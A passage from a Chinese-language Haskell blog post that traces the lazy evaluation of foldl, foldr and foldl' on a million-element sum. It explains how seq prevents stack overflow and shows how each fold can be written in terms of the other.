&lt;span class=&quot;number&quot;&gt;1000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;title&quot;&gt;in&lt;/span&gt; z1000000 &lt;span class=&quot;comment&quot;&gt;--&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;-- Now a large chain of +&#39;s will be created:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;title&quot;&gt;let&lt;/span&gt; z1 =  &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; + &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    z2 = z1 + &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    z3 = z2 + &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    z4 = z3 + &lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    ...&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    z999997 = z999996 + &lt;span class=&quot;number&quot;&gt;999997&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    z999998 = z999997 + &lt;span class=&quot;number&quot;&gt;999998&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    z999999 = z999998 + &lt;span class=&quot;number&quot;&gt;999999&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;title&quot;&gt;in&lt;/span&gt; z999999 + &lt;span class=&quot;number&quot;&gt;1000000&lt;/span&gt; &lt;span class=&quot;comment&quot;&gt;--&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;title&quot;&gt;let&lt;/span&gt; z1 =  &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; + &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    z2 = z1 + &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    z3 = z2 + &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    z4 = z3 + &lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    ...&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    z999997 = z999996 + &lt;span class=&quot;number&quot;&gt;999997&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    z999998 = z999997 + &lt;span class=&quot;number&quot;&gt;999998&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;title&quot;&gt;in&lt;/span&gt;  (z999998 + &lt;span class=&quot;number&quot;&gt;999999&lt;/span&gt;) + &lt;span class=&quot;number&quot;&gt;1000000&lt;/span&gt; &lt;span class=&quot;comment&quot;&gt;--&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;title&quot;&gt;let&lt;/span&gt; z1 =  &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; + &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    z2 = z1 + &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    z3 = z2 + &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    z4 = z3 + &lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    ...&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;title&quot;&gt;in&lt;/span&gt;  (((z999996 + &lt;span class=&quot;number&quot;&gt;999997&lt;/span&gt;) + &lt;span class=&quot;number&quot;&gt;999998&lt;/span&gt;) + &lt;span class=&quot;number&quot;&gt;999999&lt;/span&gt;) + &lt;span class=&quot;number&quot;&gt;1000000&lt;/span&gt; &lt;span class=&quot;comment&quot;&gt;--&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;-- ...&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;title&quot;&gt;let&lt;/span&gt; z1 =  &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; + &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    z2 = z1 + &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    z3 = z2 + &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;title&quot;&gt;in&lt;/span&gt;  ((((((z3 + &lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;) + &lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;) + ...) + &lt;span class=&quot;number&quot;&gt;999997&lt;/span&gt;) + &lt;span class=&quot;number&quot;&gt;999998&lt;/span&gt;) + &lt;span class=&quot;number&quot;&gt;999999&lt;/span&gt;) + &lt;span class=&quot;number&quot;&gt;1000000&lt;/span&gt; &lt;span class=&quot;comment&quot;&gt;--&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;title&quot;&gt;let&lt;/span&gt; z1 =  &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; + &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    z2 = z1 + &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;title&quot;&gt;in&lt;/span&gt;  (((((((z2 + &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;) + &lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;) + &lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;) + ...) + &lt;span class=&quot;number&quot;&gt;999997&lt;/span&gt;) + &lt;span class=&quot;number&quot;&gt;999998&lt;/span&gt;) + &lt;span class=&quot;number&quot;&gt;999999&lt;/span&gt;) + &lt;span class=&quot;number&quot;&gt;1000000&lt;/span&gt; &lt;span class=&quot;comment&quot;&gt;--&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;title&quot;&gt;let&lt;/span&gt; z1 =  &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; + &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;title&quot;&gt;in&lt;/span&gt;  ((((((((z1 + &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;) + &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;) + &lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;) + &lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;) + ...) + &lt;span class=&quot;number&quot;&gt;999997&lt;/span&gt;) + &lt;span class=&quot;number&quot;&gt;999998&lt;/span&gt;) + &lt;span class=&quot;number&quot;&gt;999999&lt;/span&gt;) + &lt;span class=&quot;number&quot;&gt;1000000&lt;/span&gt; &lt;span class=&quot;comment&quot;&gt;--&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(((((((((&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; + &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;) + &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;) + &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;) + &lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;) + &lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;) + ...) + &lt;span class=&quot;number&quot;&gt;999997&lt;/span&gt;) + &lt;span class=&quot;number&quot;&gt;999998&lt;/span&gt;) + &lt;span class=&quot;number&quot;&gt;999999&lt;/span&gt;) + &lt;span class=&quot;number&quot;&gt;1000000&lt;/span&gt; &lt;span class=&quot;comment&quot;&gt;--&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;-- Now we can actually start reducing:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;((((((((&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; + &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;) + &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;) + &lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;) + &lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;) + ...) + &lt;span class=&quot;number&quot;&gt;999997&lt;/span&gt;) + &lt;span class=&quot;number&quot;&gt;999998&lt;/span&gt;) + &lt;span class=&quot;number&quot;&gt;999999&lt;/span&gt;) + &lt;span class=&quot;number&quot;&gt;1000000&lt;/span&gt; &lt;span class=&quot;comment&quot;&gt;--&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(((((((&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt; + &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;) + &lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;) + &lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;) + ...) + &lt;span class=&quot;number&quot;&gt;999997&lt;/span&gt;) + &lt;span class=&quot;number&quot;&gt;999998&lt;/span&gt;) + &lt;span class=&quot;number&quot;&gt;999999&lt;/span&gt;) + &lt;span class=&quot;number&quot;&gt;1000000&lt;/span&gt; &lt;span class=&quot;comment&quot;&gt;--&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;...&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;number&quot;&gt;499998500001&lt;/span&gt; + &lt;span class=&quot;number&quot;&gt;999999&lt;/span&gt;) + &lt;span class=&quot;number&quot;&gt;1000000&lt;/span&gt; &lt;span class=&quot;comment&quot;&gt;--&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;499999500000&lt;/span&gt; + &lt;span class=&quot;number&quot;&gt;1000000&lt;/span&gt; &lt;span class=&quot;comment&quot;&gt;--&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;500000500000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;由此可见，二者能够处理的列表长度其实相同，主要受栈空间的限制。&lt;code&gt;foldr&lt;/code&gt; 受栈空间限制的原因是它本身并不采用尾递归，而 &lt;code&gt;foldl&lt;/code&gt; 尽管使用了尾递归的形式，但因为惰性求值的特性：表达式仅在真正需要它们的值的时候才会被计算，故形式上的尾递归并没有真正起作用。所以 &lt;code&gt;foldr&lt;/code&gt; 的限制是无法解除的，但 &lt;code&gt;foldl&lt;/code&gt; 只要摒弃惰性求值，就可以摆脱限制，从形式上的尾递归变成真实意义上的尾递归。&lt;/p&gt;
&lt;p&gt;另外，我们还能看出， &lt;strong&gt;&lt;code&gt;foldl&lt;/code&gt; 隐含了堆列表做一个逆序操作，而 &lt;code&gt;foldr&lt;/code&gt; 则保持了列表的顺序&lt;/strong&gt; 。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;这两者因为效率低下，在生产代码中均不会出现。&lt;/strong&gt;&lt;/p&gt;
&lt;h1 id=&quot;Foldl’&quot;&gt;&lt;a href=&quot;#Foldl’&quot; class=&quot;headerlink&quot; title=&quot;Foldl’&quot;&gt;&lt;/a&gt;Foldl’&lt;/h1&gt;&lt;p&gt;使用 &lt;code&gt;seq&lt;/code&gt; 可以使表达式被立刻求值。&lt;code&gt;foldl&amp;#39;&lt;/code&gt; 的定义如下，每次进入尾递归前都要计算出参数 &lt;code&gt;z&amp;#39;&lt;/code&gt; 的值，而不是将表达式的绑定入堆，之后再入栈、出栈。生产代码中只会出现 &lt;code&gt;foldl&amp;#39;&lt;/code&gt;。&lt;/p&gt;
&lt;figure class=&quot;highlight haskell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;title&quot;&gt;foldl&#39;&lt;/span&gt; f z []     = z&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;title&quot;&gt;foldl&#39;&lt;/span&gt; f z (x:xs) = &lt;span class=&quot;keyword&quot;&gt;let&lt;/span&gt; z&#39; = z `f` x &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; seq z&#39; $ foldl&#39; f z&#39; xs&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;现在上面例子的计算过程如下，运算将不会导致栈溢出。&lt;/p&gt;
&lt;figure class=&quot;highlight haskell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;title&quot;&gt;foldl&#39;&lt;/span&gt; (+) &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; [&lt;span class=&quot;number&quot;&gt;1.&lt;/span&gt;&lt;span class=&quot;number&quot;&gt;.1000000&lt;/span&gt;] &lt;span class=&quot;comment&quot;&gt;--&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;title&quot;&gt;foldl&#39;&lt;/span&gt; (+) &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; [&lt;span class=&quot;number&quot;&gt;2.&lt;/span&gt;&lt;span class=&quot;number&quot;&gt;.1000000&lt;/span&gt;] &lt;span class=&quot;comment&quot;&gt;--&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;title&quot;&gt;foldl&#39;&lt;/span&gt; (+) &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt; [&lt;span class=&quot;number&quot;&gt;3.&lt;/span&gt;&lt;span class=&quot;number&quot;&gt;.1000000&lt;/span&gt;] &lt;span class=&quot;comment&quot;&gt;--&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;title&quot;&gt;foldl&#39;&lt;/span&gt; (+) &lt;span class=&quot;number&quot;&gt;6&lt;/span&gt; [&lt;span class=&quot;number&quot;&gt;4.&lt;/span&gt;&lt;span class=&quot;number&quot;&gt;.1000000&lt;/span&gt;] &lt;span class=&quot;comment&quot;&gt;--&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;title&quot;&gt;foldl&#39;&lt;/span&gt; (+) &lt;span class=&quot;number&quot;&gt;10&lt;/span&gt; [&lt;span class=&quot;number&quot;&gt;5.&lt;/span&gt;&lt;span class=&quot;number&quot;&gt;.1000000&lt;/span&gt;] &lt;span class=&quot;comment&quot;&gt;--&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;-- ...&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;title&quot;&gt;foldl&#39;&lt;/span&gt; (+) &lt;span class=&quot;number&quot;&gt;499999500000&lt;/span&gt; [&lt;span class=&quot;number&quot;&gt;1000000&lt;/span&gt;] &lt;span class=&quot;comment&quot;&gt;--&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;title&quot;&gt;foldl&#39;&lt;/span&gt; (+) &lt;span class=&quot;number&quot;&gt;500000500000&lt;/span&gt; [] &lt;span class=&quot;comment&quot;&gt;--&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;500000500000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;通常，我们会在 &lt;code&gt;foldr&lt;/code&gt; 和 &lt;code&gt;foldl&amp;#39;&lt;/code&gt; 之间选择。&lt;/p&gt;
&lt;p&gt;但使用 &lt;code&gt;foldl&amp;#39;&lt;/code&gt; 也存在缺陷，考虑下面的例子，&lt;code&gt;foldl&lt;/code&gt; 将返回 0（&lt;code&gt;foldr&lt;/code&gt; 也一样），而 &lt;code&gt;foldl&amp;#39;&lt;/code&gt; 将产生一个 &lt;code&gt;undifined&lt;/code&gt; 错误。这是因为 &lt;code&gt;(*)&lt;/code&gt; 具有短路特性，如果 &lt;code&gt;(*)&lt;/code&gt; 符号右侧的子式为 0 ，则左式不必计算。在 &lt;code&gt;foldl&lt;/code&gt; 中，最终展开式为 &lt;code&gt;((((1 * 2) * 3) * undefined) * 5) * 0&lt;/code&gt;，直接求出结果为 0；在 &lt;code&gt;foldr&lt;/code&gt; 中，最终展开式为 &lt;code&gt;2 * (3 * (undifined * (5 * (0 * 1))))&lt;/code&gt;，可以看出，首先 &lt;code&gt;5 * (0 * 1)&lt;/code&gt; 计算出　0，之后变为 &lt;code&gt;2 * (3 * (undifined * 0))&lt;/code&gt;，此时短路，因此求出 0。&lt;/p&gt;
&lt;figure class=&quot;highlight haskell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;title&quot;&gt;foldl&lt;/span&gt; (*) &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; [&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;,undefined,&lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;title&quot;&gt;foldl&#39;&lt;/span&gt; (*) &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; [&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;,undefined,&lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h1 id=&quot;Foldr-和-Foldl-的转化&quot;&gt;&lt;a href=&quot;#Foldr-和-Foldl-的转化&quot; class=&quot;headerlink&quot; title=&quot;Foldr 和 Foldl 的转化&quot;&gt;&lt;/a&gt;Foldr 和 Foldl 的转化&lt;/h1&gt;&lt;p&gt;&lt;code&gt;foldl&lt;/code&gt; 和 &lt;code&gt;foldr&lt;/code&gt; 可以互相表示。&lt;/p&gt;
&lt;p&gt;用 &lt;code&gt;foldr&lt;/code&gt; 表示 &lt;code&gt;foldl&lt;/code&gt; 如下。这个转化其实并不完全正确，因为 &lt;code&gt;foldr&lt;/code&gt; 可以处理无穷列表，而 &lt;code&gt;foldl&lt;/code&gt; 本身并不具有这一特性。&lt;/p&gt;
&lt;figure class=&quot;highlight haskell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;title&quot;&gt;foldl&#39;&#39;&lt;/span&gt; :: (a -&amp;gt; b -&amp;gt; a) -&amp;gt; a -&amp;gt; [b] -&amp;gt; a&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;title&quot;&gt;foldl&#39;&#39;&lt;/span&gt; f z xs = foldr step id xs z&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;where&lt;/span&gt; step x g acc = g (f acc x)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;类似的，用 &lt;code&gt;foldl&lt;/code&gt; 表示 &lt;code&gt;foldr&lt;/code&gt; 如下。&lt;/p&gt;
&lt;figure class=&quot;highlight haskell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;title&quot;&gt;foldr&#39;&#39;&lt;/span&gt; :: (b -&amp;gt; a -&amp;gt; a) -&amp;gt; a -&amp;gt; [b] -&amp;gt; a&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;title&quot;&gt;foldr&#39;&#39;&lt;/span&gt; f z xs = foldl step id xs z&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;where&lt;/span&gt; step g acc x = g (f acc x)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这里我将试图把自己的理解表述出来：&lt;/p&gt;
&lt;p&gt;以 &lt;code&gt;foldr&lt;/code&gt; 表示 &lt;code&gt;foldl&lt;/code&gt; 为例。&lt;code&gt;foldr&lt;/code&gt; 看上去似乎接收了四个参数，但经过部分施用，&lt;code&gt;foldr step id xs&lt;/code&gt; 实际产生了一个类型签名为 &lt;code&gt;a -&amp;gt; a&lt;/code&gt; 的结果，这里的 &lt;code&gt;a&lt;/code&gt; 即为 &lt;code&gt;foldl&lt;/code&gt; 传入的零值 &lt;code&gt;z&lt;/code&gt; 的类型。因此 &lt;code&gt;foldr&lt;/code&gt; 的作用即是产生了这样一个函数，这个函数的格式类似上面例子中的 &lt;code&gt;1 + (2 + (3 + (4 + (... + (999999 + (1000000 + 0))...))))&lt;/code&gt;，但它接收一个参数，这个参数就是式中的 &lt;code&gt;0&lt;/code&gt;，即它接收传入的零值 &lt;code&gt;z&lt;/code&gt;，返回对这个零值作用的结果。&lt;/p&gt;
&lt;p&gt;下面观察函数是如何产生的。&lt;code&gt;step&lt;/code&gt; 作为折叠函数，接收三个参数，参数 &lt;code&gt;x&lt;/code&gt; 是剩余列表的最后一个元素（因为是 &lt;code&gt;foldr&lt;/code&gt;，方向从右向左），参数 &lt;code&gt;acc&lt;/code&gt; 是累积值。我们知道 &lt;code&gt;foldr&lt;/code&gt; 中的折叠函数实际只接收两个参数，因此 &lt;code&gt;step&lt;/code&gt; 是一个部分施用的函数。观察 &lt;code&gt;step&lt;/code&gt; 的类型签名，因为在 &lt;code&gt;foldr&lt;/code&gt; 中，它接受一个函数 &lt;code&gt;id&lt;/code&gt; 作为零值，所以它的类型是 &lt;code&gt;a -&amp;gt; (b -&amp;gt; b) -&amp;gt; (b -&amp;gt; b)&lt;/code&gt;。因为 &lt;code&gt;step&lt;/code&gt; 每次只能获得两个参数（剩余列表中的最后一个值和 &lt;code&gt;acc&lt;/code&gt;），所以它将返回一个 &lt;code&gt;(b -&amp;gt; b)&lt;/code&gt; 作为下一次的 &lt;code&gt;acc&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;用一个例子演示 &lt;code&gt;foldr&lt;/code&gt; 具体的展开过程。考虑 &lt;code&gt;foldl&amp;#39;&amp;#39; f zero [a1, a2, a3]&lt;/code&gt;，这里 &lt;code&gt;foldl&amp;#39;&amp;#39;&lt;/code&gt; 是用 &lt;code&gt;foldr&lt;/code&gt; 表示的 &lt;code&gt;foldl&lt;/code&gt;。其展开过程如下：&lt;/p&gt;
&lt;figure class=&quot;highlight haskell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;title&quot;&gt;foldl&#39;&#39;&lt;/span&gt; f zero [a1, a2, a3]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;= 